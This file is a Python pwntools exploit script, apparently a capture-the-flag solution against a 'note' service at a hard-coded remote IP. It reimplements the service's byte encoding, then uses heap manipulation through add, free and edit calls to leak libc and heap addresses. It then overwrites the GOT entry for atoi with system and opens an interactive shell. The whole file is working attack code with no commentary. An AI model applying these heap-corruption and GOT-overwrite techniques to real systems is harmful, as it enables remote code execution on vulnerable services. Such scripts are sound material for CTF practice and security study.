#!/usr/bin/python

from pwn import *
import sys
#context.log_level = 'debug'
#r = process('./note_client')
if len(sys.argv) > 1:
  r = remote('103.237.98.97', 23501)
else:
  r = remote('127.0.0.1', 31337)

with open('table', 'rb') as f:
  table = f.read()

def decode(ci):
  '''
  tmp = s[i] & (s[i] ^ 0xFFFFFF7F);
  s[i] = (*(&table[~(~i | 0xFFFFFF80)] + tmp) & 0x71 | ~*(&table[~(~i | 0xFFFFFF80)] + tmp) & 0x8E) ^ (s[i] & 0x71 | ~s[i] & 0x8E);
  tmp2 = ~(s[i] & (s[i] ^ 0xFFFFFF80));
  s[i] = ~(tmp2 | ~(_BYTE)tmp) | (s[i] & (s[i] ^ 0x80) & 0x7D | tmp2 & 0x82) ^ (tmp & 0x7D | ~(_BYTE)tmp & 0x82);
  '''
  ci = unhex(ci)
  s = []
  for b in ci:
    s.append(ord(b))
  for i in xrange(len(s)):
    tmp = s[i] & (s[i]^0xffffff7f)
    s[i] = s[i] ^ ord(table[(~(~i | 0xffffff80))+tmp])
    tmp2 = ~(s[i] & (s[i]^0xffffff80))
    s[i] = ~(tmp2 | ~tmp) | (s[i] & (s[i] ^ 0x80) & 0x7D | tmp2 & 0x82) ^ (tmp & 0x7D | ~tmp & 0x82)
  res = ''
  for i in xrange(len(s)):
    res += chr(s[i])
  return res

def encode(ci):
  '''
  tmp = ~(~s[i] | 0xFFFFFF7F);
  s[i] = (*(&table[tmp] + (i & (i ^ 0xFFFFFF80))) & 0xF7 | ~*(&table[tmp] + (i & (i ^ 0xFFFFFF80))) & 8) ^ (s[i] & 0xF7 | ~s[i] & 8);
  tmp2 = ~(s[i] & (s[i] ^ 0xFFFFFF80));
  s[i] = ~(tmp2 | ~(_BYTE)tmp) | (s[i] & (s[i] ^ 0x80) & 5 | tmp2 & 0xFA) ^ (tmp & 5 | ~(_BYTE)tmp & 0xFA);
  ''' 
  s = []
  for b in ci:
    s.append(ord(b))
  for i in xrange(len(s)):
    tmp = ~(~s[i] | 0xFFFFFF7F)
    s[i] = ord(table[tmp+(i&(i^0xffffff80))]) ^ s[i]
    tmp2 = ~(s[i] & (s[i] ^ 0xFFFFFF80));
    s[i] = ~(tmp2 | ~tmp) | (s[i] & (s[i] ^ 0x80) & 5 | tmp2 & 0xFA) ^ (tmp & 5 | ~tmp & 0xFA);
  res = ''
  for x in s:
    res += "%02X" % x
  return res

def send(ci):
  r.sendline(encode(ci))

def pt():
  for s in r.recvuntil('56077B742A04\n').split():
    decode(s)

def add(name, note, sz, body):
  pt()
  log.info('adding')
  send('add\n')
  getline()
  send(str(sz))
  getline()
  send(name)
  getline()
  send(note)
  getline()
  send(body)

def edit(idx, name, note, body):
  pt()
  log.info('editing')
  send('edit\n')
  getline()
  send(str(idx))
  getline()
  send(name)
  getline()
  send(note)
  getline()
  send(body)

def getline():  
  return decode(r.recvline())

def free(idx):
  pt()
  send('free\n')
  log.info('freeing %d' % idx)
  print getline()
  send(str(idx))

def read(idx):
  pt()
  send('read\n')
  getline()
  send(str(idx))
  getline() # note #
  getline() # date
  res = getline()[len('\t[*] Name :'):]
  getline() # body
  return res[:-1]

add('AAAA\n','BBBB\n',36, 'C'*32+'\n')
add('AAAA\n','BBBB\n',36, 'D'*32+'\n')
add('AAAA\n','BBBB\n', 310, p32(0x31)*75+'\n')
add('AAAA\n','BBBB\n',36, 'O'*32+'\n')
add('AAAA\n','BBBB\n',36, 'O'*32+'\n')

free(0)
edit(1, "AAAA\n", "BBBB\n", 'E'*32+p32(0xb0))
free(2)

add('AAAA\n', 'BBBB\n', 32, '\n')
free(3)
name = read(1)
libc_base = u32(name[:4])-0x1ab450
heap_base = u32(name[4:8])-0x1228
log.info("libc @ 0x%x" % libc_base)
log.info("heap @ 0x%x" % heap_base)

free(0)

add('AAAA\n', 'BBBB\n', 160-4-48, '\x81'*37+'\n')

add('AAAA\n', 'BBBB\n', 48, 'Z'*36+'\n')

edit(1, p32(0)+p32(0x41)+p32(heap_base+0x18)+p32(heap_base+0x1c)+'\n', 'B\n','GGGG'*4 + p32(0x40) + p32(0x68)+ '\n')
free(2)
elf=ELF('note')
edit(1, p32(elf.got['atoi'])+p32(1)+"\x24"+'\n', '\n', '\n')
libc = ELF('./bc.so.6')
libc.address = libc_base
edit(0, p32(libc.symbols['system']) + p32(libc.symbols['__fpurge'])+'\n', '\n', '\n')

send('add\n')
getline()
send('sh\n')

r.interactive()
